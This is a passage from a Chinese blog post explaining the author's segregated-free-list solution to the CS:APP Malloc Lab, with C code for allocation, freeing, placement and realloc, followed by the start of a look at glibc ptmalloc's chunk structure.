fragmentation：外部碎片，即还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。这个比较难理解，这里用一张图来说明一下。<br><img src="/2019/02/14/csapp-Malloclab/1.png" alt="external fragmentation"><br>　　假设上面是内存的一部分。这个时候我如果想要一个大小为3 bytes的内存，我们发现尽管这部分总共有4 bytes的内存没有被我们用到，但是它们被隔开了，我们无法利用。因此，在这种情况下，内存中的这两个没有用到的部分就是外部碎片。需要注意的是，外部碎片和我们请求的大小有关。比如这个时候我要的如果是2 bytes大小的内存，我们发现中间的块是足够的，因此这个时候这个就不算外部碎片了。</p><h2 id="about-pointer-（review）"><a href="#about-pointer-（review）" class="headerlink" title="about pointer （review）"></a>about pointer （review）</h2><p>　　C语言的指针向来是一个难点，在这个实验中，我们需要对指针有一定的理解。本质上而言，指针和其他int，long等类型的数据的存储并没有什么区别，同样是一串数字，指针更多像是C语言为我们提供的<b>地址的抽象</b>，使得我们能够更好地利用地址。<br>　　对于一个特定的系统以及编译环境下，指针的大小一般是一样的，通常32位系统下为32位(4 bytes), 64位系统下为64位(8 bytes)。准确上说，指针指向的是所指对象的首个字节。如下图，在一个小端法的机器中，一个大小为0x10f的int型数据存放在地址为0x7b3c~0x7b3f(共4 bytes)的内存区域中。每个字节占用为一个存储单位，对应着一个特定的地址。<br><img src="/2019/02/14/csapp-Malloclab/2.png" alt="pointer"><br>　　这个时候看下以下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="number">0x10f</span>; <span class="comment">// 假设n存放在上述的内存区域中</span></span><br><span class="line"><span class="keyword">int</span>* p = &amp;n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p %p"</span>, p, p + <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>　　输出应该是多少？答案是输出应该为0x7b3c 0x7b40。对于一个指针而言，+1代表着增加一个单位长度，对于int型，大小为4个字节，故一个单位长度大小为4，倘若这个时候n的类型为short，则p+1的值应该为0x7b3e，依此类推。注意，一般情况下，指针之间的加法和乘除法是没有意义的。<br>　　继续看以下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="number">0x10f</span>;</span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span> *)(&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p);</span><br></pre></td></tr></table></figure></p><p>　　这个时候的输出又是多少呢？答案是0xf。当我们使用取值符号时，得到的数字和指针的类型有关，同样是值为0x7b3c的指针，若类型为int，则应取四个字节，得到0x0000010f, 而如果是char类型的指针，得到的应该是0x0f，同理，若类型为long long，则得到的应该是0x000001120000010f。<br>　　因此，通过类型转换，我们可以实现很多意想不到的事情。</p><h2 id="mm-c"><a href="#mm-c" class="headerlink" title="mm.c"></a>mm.c</h2><p>　　allocated block 和 free block的具体结构如下。其中，successor存的是当前链表中下一个block的地址，predecessor存的是上一个block的地址。通过链表的形式将free block 串联在一起。<br><img src="/2019/02/14/csapp-Malloclab/3.png" alt="external fragmentation"><br><img src="/2019/02/14/csapp-Malloclab/4.png" alt="external fragmentation"><br>　　注意，这里有一个细节，allocated block中我们将脚部去掉了。与此同时，为了起到和脚部相似的作用，我们在flag位置中，用第二个位来标记上一个block(注意，这里的上一个是指在堆内存中的上一个块，而不是链表中的)是被占用。这样，只有当该标志位为0的时候，我们才认为上一个块是空闲的，可以用来合并。</p><h3 id="define"><a href="#define" class="headerlink" title="define"></a>define</h3><p>　　对于这个实验来说，良好的宏定义有助于我们的理解。笔者的宏定义如下(仅列出部分):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)  (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val) (*(unsigned int*)(p) = (unsigned int)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_PREV_ALLOC(p) (GET(p) &amp; 0x2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_PTR(bp) ((char*)(bp))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_PTR(bp) ((char*)(bp) + WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LINK_NEXT(bp) ((char *)GET(bp))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LINK_LAST(bp) ((char *)GET(bp + WSIZE))</span></span><br></pre></td></tr></table></figure></p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>　　整个实验的全局变量如下：</p><blockquote><p>static void* start_pos;  // 永远指向当前堆的最顶部<br>static char* end_link_list;   // 链表数组后的下一个块<br>static char* start_link_list; // 链表数组的表头</p></blockquote><p>　　因为本次实验要求最好将数据存放在堆当中，因此我们选择将各个大小的链表头存放在堆一开始的一段连续区间中。具体存放如下(在mm_init函数中执行)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((start = (<span class="keyword">char</span>*) mem_sbrk(<span class="number">14</span> * WSIZE)) == (<span class="keyword">char</span>*) <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">PUT(start, <span class="number">0</span>);                   <span class="comment">// size &lt;= 16， 因为最小的一个块大小为16，因此这里将size小于16的全部放在同一个链表当中</span></span><br><span class="line">PUT(start + WSIZE, <span class="number">0</span>);           <span class="comment">// size &lt;= 32</span></span><br><span class="line">PUT(start + <span class="number">2</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 64</span></span><br><span class="line">PUT(start + <span class="number">3</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 128</span></span><br><span class="line">PUT(start + <span class="number">4</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 256</span></span><br><span class="line">PUT(start + <span class="number">5</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 512</span></span><br><span class="line">PUT(start + <span class="number">6</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 1024</span></span><br><span class="line">PUT(start + <span class="number">7</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 2048</span></span><br><span class="line">PUT(start + <span class="number">8</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &lt;= 4096</span></span><br><span class="line">PUT(start + <span class="number">9</span> * WSIZE, <span class="number">0</span>);       <span class="comment">// size &gt; 4096</span></span><br><span class="line">PUT(start + <span class="number">10</span> * WSIZE, <span class="number">0</span>);         <span class="comment">// for alignment</span></span><br><span class="line">PUT(start + <span class="number">11</span> * WSIZE, PACK(<span class="number">8</span>,<span class="number">1</span>)); <span class="comment">// the prologue block</span></span><br><span class="line">PUT(start + <span class="number">12</span> * WSIZE, PACK(<span class="number">8</span>,<span class="number">1</span>));</span><br><span class="line">PUT(start + <span class="number">13</span> * WSIZE, PACK(<span class="number">0</span>,<span class="number">3</span>)); <span class="comment">// the epilogue block</span></span><br><span class="line">start_pos = start + <span class="number">14</span> * WSIZE;</span><br><span class="line">start_link_list = start;</span><br><span class="line">end_link_list = start + <span class="number">10</span> * WSIZE;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/14/csapp-Malloclab/5.png" alt="heap_init"></p><h3 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h3><p>　　关于堆的拓展，我们需要注意到，每次拓展的大小都应该为8的倍数，这样才能保证8字节对齐。<br>　　其次，在拓展的时候，可以有一个小优化。假设我们需要拓展的大小为size。拓展时，我们先查看位于堆顶端的块，如果堆顶端是一个空闲的块，并且大小为msize的话，我们可以只拓展size - msize即可。这样的话可以在一定程度上提高空间利用率(针对某些比较特殊的数据效果很明显)。当然，这样的话也会使得整个程序效率降低(频繁使用mem_sbrk的话对程序性能的影响是很大的，这是一个系统调用)。</p><h3 id="link-list"><a href="#link-list" class="headerlink" title="link_list"></a>link_list</h3><p>　　在本实验中，为了使用best fit，我们选择采用将链表按照从小到大的顺序排序，然后从头开始遍历链表，当遇到第一个满足要求大小的块，这个块就一定是最适合我们的。因此，我们每次插入某一个块的时候，别忘了要遍历链表，然后将该块放到正确的位置上，以维护链表的单调性。</p><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>　　在寻找能放得下size个字节的最小的块的时候，我们有两种处理策略。笔者采用的方法如下：遍历当前的链表，寻找是否有满足要求的块，有的话就返回。另一种方法是只遍历size所在的链表，如果没有，直接返回NULL，交由后面堆去拓展。<br>　　第一种方法的话很明显时间上效率较低，但是能够保证较大的块能够被使用。后一种方法的话时间上效率较高，但是可能导致较大的某个块一直无法被利用，从而导致了空间的浪费。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getSizeClass 返回当前的size 值对应在第几条链表上</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">find_fit</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* link_begin = start_link_list + WSIZE * getSizeClass(size);</span><br><span class="line">    <span class="keyword">while</span>(link_begin != end_link_list) &#123;</span><br><span class="line">        <span class="keyword">char</span>* cur_node = LINK_NEXT(link_begin);</span><br><span class="line">        <span class="keyword">while</span>(cur_node != <span class="literal">NULL</span> &amp;&amp; GET_SIZE(HDRP(cur_node)) &lt; size) &#123;</span><br><span class="line">            cur_node = LINK_NEXT(cur_node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cur_node != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> cur_node;</span><br><span class="line">        link_begin += WSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc-amp-free-1"><a href="#malloc-amp-free-1" class="headerlink" title="malloc &amp; free"></a>malloc &amp; free</h3><p>　　如下。有几个要注意的点。首先，分配内存的时候，我们需要一个大小至少为WSIZE(allocated block的头部) + size的块，且最小为16。如果小于16的话，会导致free的时候放不下，从而出现问题。其次，注意好标志位。free的时候下一个块的第二个标志位应该清零。以及free的时候，要顺便看下前后能不能合并，可以合并的话应该合并完后再插入到链表当中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> newsize = MAX(ALIGN(size + WSIZE), <span class="number">16</span>), incr;</span><br><span class="line">    <span class="keyword">void</span>* addr;</span><br><span class="line">    <span class="comment">// 这里我用findFitAndRemove寻找满足要求的块，找到的话顺便删除，没找到则返回NULL</span></span><br><span class="line">    <span class="keyword">if</span> ((addr = findFitAndRemove(newsize)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        incr = MAX(CHUNKSIZE, newsize);</span><br><span class="line">        extend_heap(incr / DSIZE);</span><br><span class="line">        addr = findFitAndRemove(newsize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> place(addr, newsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_PREV_ALLOC(HDRP(ptr));</span><br><span class="line">    AND(HDRP(NEXT_BLKP(ptr)), ~<span class="number">0x2</span>);      <span class="comment">// 标志位清零</span></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, prev_alloc));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, prev_alloc));</span><br><span class="line">    PUT(NEXT_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(LAST_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">    coalesced(ptr);                       <span class="comment">// 这个很重要，记得合并&amp;插入链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>　　这个函数单独拿出来是我们的放置策略的问题。这里，参考了网上某位<a href="https://www.cnblogs.com/liqiuhao/p/8252373.html" target="_blank" rel="noopener">大牛</a>的写法(如果涉及侵权，请联系我修改)。具体为什么要这样写，该文章中说得已经很清楚了。这种写法主要是为了对应binary-bal文件。这里简单概括一下。<br>　　其实核心思想就是将大的块放在右侧，小的块放在左侧，然后当大的块free掉之后，就能形成一个更大的块来存放。其实更多情况下这更像是一种针对数据造函数的思想，当然，如果数据更改或者是一些顺序更换，这样的写法就有时候反而会导致效率极度下降。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">place</span><span class="params">(<span class="keyword">void</span>* ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> all_size = GET_SIZE(HDRP(ptr)), res_size = all_size - size;</span><br><span class="line">    <span class="keyword">if</span> (res_size &lt; <span class="number">16</span>) &#123;</span><br><span class="line">        OR(HDRP(NEXT_BLKP(ptr)), <span class="number">0x2</span>);</span><br><span class="line">        size = all_size;</span><br><span class="line">        PUT(HDRP(ptr), PACK(size, <span class="number">0x3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (size &lt; <span class="number">96</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span>* new_block = (<span class="keyword">char</span>*)ptr + size;</span><br><span class="line">        PUT(HDRP(new_block), PACK(res_size, <span class="number">0x2</span>));</span><br><span class="line">        PUT(FTRP(new_block), PACK(res_size, <span class="number">0x2</span>));</span><br><span class="line">        PUT(NEXT_PTR(new_block), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(LAST_PTR(new_block), <span class="literal">NULL</span>);</span><br><span class="line">        add_node(new_block, getSizeClass(res_size));</span><br><span class="line">        PUT(HDRP(ptr), PACK(size, <span class="number">0x3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">char</span>* new_block = (<span class="keyword">char</span>*)ptr + res_size;</span><br><span class="line">        PUT(HDRP(ptr), PACK(res_size, <span class="number">0x2</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(res_size, <span class="number">0x2</span>));</span><br><span class="line">        PUT(NEXT_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(LAST_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">        add_node(ptr, getSizeClass(res_size));</span><br><span class="line">        PUT(HDRP(new_block), PACK(size, <span class="number">0x3</span>));</span><br><span class="line">        ptr = new_block;</span><br><span class="line">        OR(HDRP(NEXT_BLKP(ptr)), <span class="number">0x2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><p>　　关于这个函数，是因为它有比较多的可以优化的地方。trace文件中的最后两个测试如果不采用一定的优化的话，会导致空间利用率很低，甚至Out of memory。<br>　　首先，如果realloc的size比之前还小，那么我们不需要进行拷贝，直接返回即可(或者可以考虑对当前块进行分割)<br>　　其次，如果下一块是一个空闲块的话，我们可以直接将其占用。这样的话可以很大程度上减少external fragmentation。充分地利用了空闲的块。(前一个块是空闲的话并没有什么作用。还是需要将内容复制过去，因此不讨论)<br>　　接着，如果下一个块恰好是堆顶，我们可以考虑直接拓展堆，这样的话就可以避免free和malloc，提高效率。<br>　　最后，实在没有办法的情况下，我们再考虑重新malloc一块内存，并且free掉原先的内存块。这里要注意一下malloc和free的顺序，如果直接换过来的话可能导致错误。(free的时候有可能会把predecessor和successor的位置清为NULL，这里具体要看前面的函数是怎么写的。总之要小心一点。)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> oldBlockSize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">size_t</span> oldSize = oldBlockSize - WSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldSize &gt;= size) &#123;</span><br><span class="line">        <span class="comment">// 这里有另一种策略，如果realloc分配的内存过小，我们可以考虑对这个块进行分割，一定程度上提高了内存的利用率</span></span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">        <span class="keyword">size_t</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">        <span class="comment">// 下一块内存是空闲的，并且和当前块大小加起来足够用，则占用下一块内存</span></span><br><span class="line">        <span class="keyword">if</span> (!next_alloc &amp;&amp; next_size + oldSize &gt;= size) &#123;</span><br><span class="line">            delete_node(ptr + oldBlockSize, getSizeClass(next_size));</span><br><span class="line">            OR(HDRP(NEXT_BLKP(NEXT_BLKP(ptr))), <span class="number">0x2</span>);</span><br><span class="line">            PUT(HDRP(ptr), PACK(next_size + oldBlockSize, GET_PREV_ALLOC(HDRP(ptr)) | <span class="number">0x1</span>));</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 下一块内存刚好是堆的顶部，直接拓展即可。可以不用free后再malloc。</span></span><br><span class="line">        <span class="keyword">if</span> (NEXT_BLKP(ptr) == start_pos) &#123;</span><br><span class="line">            <span class="keyword">size_t</span> newsize = ALIGN(size - oldSize);</span><br><span class="line">            <span class="keyword">if</span> (mem_sbrk(newsize) == (<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            PUT(HDRP(ptr), PACK(oldBlockSize + newsize, GET_PREV_ALLOC(HDRP(ptr)) | <span class="number">0x1</span>));</span><br><span class="line">            start_pos += newsize;</span><br><span class="line">            PUT(HDRP(start_pos), PACK(<span class="number">0</span>, <span class="number">0x3</span>));</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">void</span> *newptr = mm_malloc(size);</span><br><span class="line">        <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(newptr, ptr, oldSize);</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> newptr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="something-else"><a href="#something-else" class="headerlink" title="something else"></a>something else</h3><p>　　这个实验如果要拿到满分的话，可能还是得针对具体的数据设置恰当的自定义数据结构来完成。这里笔者实在无能为力了，只能简单提一下几种常见的思路吧。<br>　　首先还是说一下按照上述方法写，如果不出意外的话，应该是有95分以上的，但是我们会发现，这种写法存在这一些弊端。首先是一些讨论明显是针对测试数据而设计的，如果测试数据更改，那么整个程序的效率就会大打折扣。其次，我们采用将各个块根据大小分组的话会出现一些问题。比如random-bal文件中，alloc的数据大多数都很大(大于4096)，或者实际应用中，多次申请相同大小的内存，它们将被放在同一个链表当中。如果分配后迟迟没有free的话，会导致链表越来越长，从而使得效率越来越低。这里有一种优化方式就是采用BST来进行维护。我们将所有大小相同的块组织成一个链表，BST中的每一个节点即为链表的表头，当某一个大小的块全部用完的时候，则将其从BST中删除，这样，插入和查找，搜索的效率均为O(log<sub>2</sub>n)。<br>　　具体的每个free块结构如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block</span> &#123;</span></span><br><span class="line">  <span class="comment">// 头部块</span></span><br><span class="line">  <span class="keyword">unsigned</span> size_head:<span class="number">29</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> flag_head:<span class="number">3</span>;</span><br><span class="line">  <span class="comment">// 链表的下一个节点和上一个节点</span></span><br><span class="line">  block* pred;</span><br><span class="line">  block* succ;</span><br><span class="line">  <span class="comment">// 树的左儿子，右儿子和父亲</span></span><br><span class="line">  block* left;</span><br><span class="line">  block* right;</span><br><span class="line">  block* father;</span><br><span class="line"></span><br><span class="line">  payload...</span><br><span class="line">  <span class="comment">// 尾部块</span></span><br><span class="line">  <span class="keyword">unsigned</span> size_foot:<span class="number">29</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> size_foot:<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　当然，采用BST的话，理论上我们运行的速度会快很多，然而，这还是有问题。BST并不能保证效率为O(log<sub>2</sub>n)，当某些情况下，比如每一次分配的大小都恰好比上次多一点点，这样的话就会导致效率急剧下降，整个BST退化成了链表。为了解决这个办法，可以采用平衡树，这使得整体的各种操作的效率会更加趋近于O(log<sub>2</sub>n)。<br>　　至于空间效率方面的话，若要拿到满分，除了根据数据再进行一些特定的判断以外，笔者暂时想不到更好的办法了。如果你有一些更好的办法，请务必告诉我。<br>　　最后，如果有需要的话，欢迎到<a href="https://github.com/little-csd/csapp_lab/blob/master/malloclab-handout/mm.c" target="_blank" rel="noopener">我的github</a>上查看详细文件。</p><h2 id="关于ptmalloc"><a href="#关于ptmalloc" class="headerlink" title="关于ptmalloc"></a>关于ptmalloc</h2><p>　　既然我们前面已经讲述了如何自己手动模拟一个allocator，那么我们不妨来简单地看看真正的malloc函数究竟是怎么样的吧！<br>　　参考资料: <a href="https://blog.csdn.net/z_ryan/article/details/79950737" target="_blank" rel="noopener">https://blog.csdn.net/z_ryan/article/details/79950737</a></p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>　　malloc中chunk的定义和我们的malloc lab颇为相似。具体定义在malloc.c文件中。其中，最后的两个next_size指针用于比较大的块中，当同一个大小的块较多时，线性遍历比较浪费时间，因此用next_size，指向下一个大小的块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* 